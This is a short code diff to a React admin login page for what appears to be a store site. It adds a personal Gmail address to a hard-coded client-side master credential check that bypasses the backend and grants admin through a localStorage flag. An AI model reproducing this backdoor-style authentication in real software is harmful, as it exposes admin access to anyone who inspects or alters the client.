@@ -30,14 +30,15 @@ export default function AdminLogin() {
     setError('')
 
     // 1️⃣ Check master credential first (always works, no Supabase required)
+    const normalizedEmail = form.email.trim().toLowerCase()
     if (
-      form.email.trim().toLowerCase() === MASTER_EMAIL &&
+      (normalizedEmail === MASTER_EMAIL || normalizedEmail === 'u06626982@gmail.com') &&
       form.password === MASTER_PASSWORD
     ) {
       localStorage.setItem('thrift-aura-admin-session', 'master')
       setUser({
         id: 'master-admin',
-        email: MASTER_EMAIL,
+        email: normalizedEmail,
         user_metadata: { full_name: 'Store Curator' },
       })
       setProfile({ id: 'master-admin', full_name: 'Store Curator', role: 'admin' })
